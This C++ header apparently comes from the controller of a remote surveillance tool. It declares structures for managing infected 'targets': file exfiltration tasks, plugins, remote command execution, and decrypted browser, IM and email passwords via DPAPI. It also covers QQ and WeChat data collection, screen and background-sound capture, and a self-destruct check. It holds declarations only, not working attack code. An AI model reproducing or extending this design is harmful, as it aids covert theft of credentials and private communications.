//---------------------------------------------------------------------------

#ifndef targetH
#define targetH
//---------------------------------------------------------------------------

#include <string>
#include <map>
#include <vector>
#include <list>
#include <set>
#include <time.h>

#include "include/T5Task.h"
#include "include/CtrAndDaeCommon.h"

#include <QtGui>
using namespace std;

extern const wchar_t* PhoneRecordFile;

//
// 文件夹监控的数据结构
//

// 文件列表
struct MonitorFileInfo
{
public:
	MonitorFileInfo(){}

	bool operator<(const MonitorFileInfo& info)
	{
		return fileName < info.fileName;
	}

	unsigned int	taskId;
	std::wstring	parentDir;
	std::wstring	fileName;
	unsigned int	fileSize;
	std::wstring	fileTime;
};


typedef std::list<MonitorFileInfo>	MonitorFileInfoList;

// 监控目录的基本信息
struct MonitorDirInfo
{
	MonitorDirInfo()
	{
		fileList = new MonitorFileInfoList;
	}

	~MonitorDirInfo()
	{
		delete fileList;
	}

	bool operator<(const MonitorDirInfo& info)
	{
		return fileList < info.fileList;
	}

	unsigned int		taskId;
	bool				isDir;
	std::wstring		monitorTime;
	std::wstring		remark;
	MonitorFileInfoList*	fileList;
};

typedef std::map<std::wstring, MonitorDirInfo*> MonitorDirMap;


#define ONLINE_COLOR    0x00EDEDDC
#define OFFLINE_COLOR   0x00D7D7D7

//---------------------------------------------------------------------------
enum STATUS_LEVEL
{
	STATUS_INFO = 0,
	STATUS_NOTE,
	STATUS_WARNING,
	STATUS_ERROR
};

// 插件结构
//
typedef struct _PLUGIN_CONTEXT
{
	ULONG			dwPluginId;
	PCHAR			lpszPluginName;			// 需要手工 free
	ULONG			dwPluginVer;
	ULONG			dwUpdateVer;
	ULONG			dwLoadType;
	ULONG			dwUpdateType;
	PCHAR			lpszProcList;			// 需要手工 free

	// 插件数据
	//
	DWORD			dwDataLen;
	PBYTE			lpbyData;				// 需要手工 free

} PLUGIN_CXT,
*PPLUGIN_CXT,
PLUGIN_CONTEXT,
*PPLUGIN_CONTEXT;

typedef struct tagDriverSet
{
    ULONG DriveMap;
    UCHAR DriveType[32];
} DriverSet;

// 文件结构
//
typedef struct _FILE_BLOCK
{
    std::wstring      widName;
    std::wstring      widPath;        // 只有在搜索的时候才使用

    ULONG           FileAttributes;
    LONGLONG        CreationTime;
    LONGLONG        LastWriteTime;
    LONGLONG        Size;

    bool            bDowned;        // 是否已经下载
    bool            bChanged;

} FILE_BLOCK,
*PFILE_BLOCK;

typedef struct tagFileTask
{
	DWORD			dwTaskID;
    DWORD           dwParentID;
    DWORD           dwTargetID;

    DWORD           dwPluginID;

	DWORD			dwErrorID;

    UINT            taskType;
    UINT            taskDirect;
	UINT            taskStatus;

	DWORD			dwTotalLen;				// 数据总长度
	DWORD			dwDaemonedLen;			// 已经缓存到中转服务器上的数据长度(可以认为是偏移量)
	DWORD			dwFinishedLen;			// 已经传输完的数据长度(可以认为是偏移量)

    BOOL			bDaemonBufFinished;		// 说明是否已经中转完毕
    int             nFinishedProp;          // 已完成比例
    int             nDaemonedProp;          // 已缓存比例

    // 目标文件时间属性  -- 只针对文件下载任务
    //
	DWORD		    dwCTHighDataTime;		// CreateTime
	DWORD			dwCTLowDataTime;		// CreateTime
	DWORD			dwLWHighDataTime;		// LastWrite
	DWORD			dwLWLowDataTime;		// LastWrite
	DWORD			dwLAHighDataTime;		// LastAcess
	DWORD			dwLALowDataTime;		// LastAcess

    HANDLE		    hFile;

    std::wstring      ctrPathW;
    std::wstring      tarPathW;

    std::string      aniTmpTaskPath;         // 临时存储的缓存路径
        
} FileTask,
*PFileTask;

// 目录信息
//
typedef struct tagDirInfo
{
	DWORD		dwQueryId;						// 便于快速定位, 0为主目录
	DWORD		dwLevel;						// 层数
	std::string  dirPathBase64;
	std::string dirData;
	DWORD		dwErrorId;						// 0 说明没有错误
	DWORD		dwFinished;						// 1 说明已经接收完毕

} DirInfo,
*PDirInfo;

//
// 高级任务     @@@有没有释放
//
typedef struct tagDirTask
{
	DWORD				dwTaskID;
	DWORD				dwTargetID;				// 目标ID

	ULONG			    taskStatus;				// 状态
	ULONG			    taskDirect;				// 方向
	DWORD				dwErrorID;				// 出错ID (当状态为ERRORED时，有效)

	std::wstring			tarDirPathW;	        // 目录路径
	DWORD				dwLevel;				// 获取的目录层数，0表示全部获取
	DWORD				dwAutoDown;				// 0 不用下载，　1自动下载

    PFileTask           lpInfoFileTask;         // 对于多层目录信息获取来说，指向唯一的Child FileTask

	// 以下仅针对目录下载 dwAutoDown == 1
	//
	DWORD				dwWorkingCount;
	DWORD				dwCanceledCount;
	DWORD				dwPausedCount;
	DWORD				dwErroredCount;
	DWORD				dwFinishedCount;
    
} DirTask,
*PDirTask;

typedef struct tagSearchFilter
{
    DWORD           dwLevel;

    bool            bNameFilter;
    bool            bTimeFilter;
    bool            bTypeFilter;
    bool            bSizeFilter;
        
    std::wstring      widName;
    std::wstring      widType;    
    ULARGE_INTEGER  uliBegTime;
    ULARGE_INTEGER  uliEndTime;
    ULONG           dwMinSize;              // 0 说明不限
    ULONG           dwMaxSize;              // 0 说明不限

} SearchFilter,
*PSearchFilter;

typedef struct tagSearchTask
{
	DWORD				dwTaskID;
	DWORD				dwTargetID;				// 目标ID

	ULONG			    taskStatus;				// 状态
	ULONG			    taskDirect;				// 方向
	DWORD				dwErrorID;				// 出错ID (当状态为ERRORED时，有效)

	std::wstring			tarDirPathW;	        // 目录路径
	DWORD				dwAutoDown;				// 0 不用下载，　1自动下载

    PFileTask           lpInfoFileTask;         // 指向唯一的Child FileTask
    
	DWORD				dwLevel;				// 获取的目录层数，0表示全部获取
    
    bool                bNameFilter;
    bool                bTimeFilter;
    bool                bTypeFilter;
    bool                bSizeFilter;

    std::wstring          widName;
    FILETIME            ftBegTime;
    FILETIME            ftEndTime;
    std::wstring          widType;
    ULONG               ulMinSize;
    ULONG               ulMaxSize;

} SearchTask,
*PSearchTask;

class TargetConnection;
class TargetDlg;

class Target
{

public:
	// 一些常量
	static const std::wstring Android_QQDataPath;
	static const std::wstring Android_WeixinDataPath;

	static bool IsMobileAppPath(const std::wstring& path);

public:
    Target();
    ~Target();

    void __fastcall CheckAndCreateDataDir();                        // 创建目标的本地目录

    FileTask* __fastcall GetFileTaskFromMap(ULONG taskId);
    DirTask * __fastcall GetDirTaskFromMap(ULONG taskId);
    SearchTask * __fastcall GetSearchTaskFromMap(ULONG taskId);

    bool __fastcall QueryFileTasking();                             // 查询是否有文件任务存在(自毁前需要进行判断)    
    void __fastcall AddFileTask(FileTask * fileTask);               // 新发现任务
    void __fastcall DeleteFileTask(FileTask * fileTask);
    void __fastcall ClearAllFileTask();

    void __fastcall FileTaskStatusChanged(FileTask * fileTask, TaskStatus oldStatus);     // 任务状态变化
    void __fastcall FileTaskPaused(FileTask *fileTask);
    void __fastcall FileTaskErrored(FileTask *fileTask);
    void __fastcall FileTaskFinished(FileTask *fileTask);
    void __fastcall FileTaskCanceled(FileTask *fileTask);
    void __fastcall FileTaskResumed(FileTask *fileTask);
    void __fastcall FileTaskProgressChanged(FileTask *fileTask);    // 任务进度变化

    void __fastcall MoveTaskFileToDataDir(FileTask *fileTask);      // 将Task数据移动到本地仿真目录    
    void __fastcall MoveTaskFileToPluginDir(FileTask *fileTask);      // 将Task数据移动到本地插件数据目录
    
    void __fastcall AddDirTask(DirTask *dirTask);
	void DirFinished(DirTask *dirTask, TaskStatus oldStatus);
    void __fastcall DirTaskStatusChanged(DirTask *dirTask, TaskStatus oldStatus);

    void __fastcall AddSearchTask(SearchTask *searchTask);
    void __fastcall SearchTaskStatusChanged(SearchTask *searchTask, TaskStatus oldStatus);

    void __fastcall StartTarDataConn();                             // 启动数据通信连接
    void __fastcall TargetDataConnOnline();                         // 数据通信连接上线
    void __fastcall TargetDataConnOffline();                        // 数据通信连接下线
    void __fastcall ScheduleTarFileTask();                          // 调度文件任务

    void __fastcall ReScheduleTarFileTask();                        // 停止当前任务，再进行调度

	std::wstring GetLocalFilePath(const std::wstring& tarPath);

	void AndroidDownloadAppDataDir();

	void IOSDownloadAppConfig();
	void IOSDownloadAppDataDir(const std::wstring& appPlist);

	void AddAppInfoListener(std::wstring listenPath);
	bool RemoveAppInfoListener(std::wstring path);
	void AppInfoListenerTriggered();

	void FlowStatistics(unsigned int bytes);
	void UpdateFlowStatistics();

	const std::map<ULONG, FileTask*>& GetFileTaskMap();
	const std::map<ULONG, DirTask*>& GetDirTaskMap();

public:

	// 系统类型
	SystemType m_sysType;

	// 杀毒软件
	std::wstring m_antiVirus;

	// 是否使用的是 3G 网络
	ULONG m_netEnv;

	// 是否被收藏
	bool m_favorite;

	// 自动获取
	int m_autoGetDirInfoDepth;

    // 关联的控制界面
    //
    QTreeWidgetItem *   treeNode;
    TargetDlg*     frmTarControl;

    // 连接
    //
    BOOL                bTarConnOnline;
    BOOL                bConnecting;
    BOOL                bCleared;           // 清除
    TargetConnection    *tarConn;
    BOOL                bIsMyTarget;
    
    // 状态
    //
    TargetStatus        tarStatus;
    LONG                lastTime;

    // 属性
    //
    ULONG               dwProtocolVersion;

    ULONG               dwTargetID;
    ULONG               dwGroupID;

    std::string          aniTargetName;
    std::wstring          widTargetName;
    ULONG               dwOsBuildNumber;

    std::string          aniRemLocalIpAddr;
    std::string          aniRemPublicIpAddr;
    std::string          aniRemMacAddr;

    ULONG               dwLangId;
    std::string          aniComputerNameBase64;
    std::string          aniOnlineProcBase64;
    std::string          aniLoginUserBase64;

    std::string          aniLocalDataDir;
    std::wstring          widLocalDataDir;
    std::wstring          widDiskDataDir;
    std::wstring          widUsbDataDir;
    std::wstring          widDelDataDir;
    std::wstring          widHttpsDataDir;     
    std::wstring          wideScreenPath;
    std::wstring          widDirPath;
	std::wstring		  widMultimediaPath;
	std::wstring		  wid3rdFilePath;
	std::wstring		  widBackSoundPath;
    
    // 插件列表
    //
   	PPLUGIN_CONTEXT		pluginVect[MAX_PLG_COUNT];

    CRITICAL_SECTION    csFileTask;

    // 目标盘符和目录信息
    //
    DriverSet           logicDriverSet;
            
    // Remote Run
    //
    BOOL                bRedirectIO;
    std::wstring          widRedirectProc;        // 重定向交互的进程名
    std::wstring          widRedirectOutput;      // 重定向之后的输出          

    // DPAPI
    //
    ULONG               dpapiId     ;
    BOOL                dpapiLoadFlag;

    // store tmp dpapi buffer
    //
    std::string         ieAutoString ;
    std::string         iePassString ;
    std::string         imsString    ;
    std::string         emailString  ;

    // members used to processing FTK cmd
    //
    FileTask                        *curFileTask;
    std::map<ULONG, FileTask *>     fileTaskMap;
    std::map<ULONG, DirTask*>       dirTaskMap;
    std::map<ULONG, SearchTask*>    searchTaskMap;

    // 用于处理分段报文数据
    //
    std::map<std::string, std::string>  dirInfoMap;

	std::set<std::wstring> m_listenPathSet;

	unsigned int m_flowStatistics;
};

extern std::map<ULONG, Target *> g_targetMap;

//---------------------------------------------------------------------------
__inline 
Target * GetTargetFromGlobalMap(ULONG targetId)
{
	std::map<ULONG,Target *>::iterator i = g_targetMap.find(targetId);
	if (i == g_targetMap.end())
	{
		return NULL;
	}

	return (Target *)(*i).second;
}

inline void RemoveTargetFromGlobalMap(ULONG targetId)
{
	std::map<ULONG,Target *>::iterator i = g_targetMap.find(targetId);
	if (i != g_targetMap.end())
	{
		g_targetMap.erase(i);
	}
}
//---------------------------------------------------------------------------

#endif
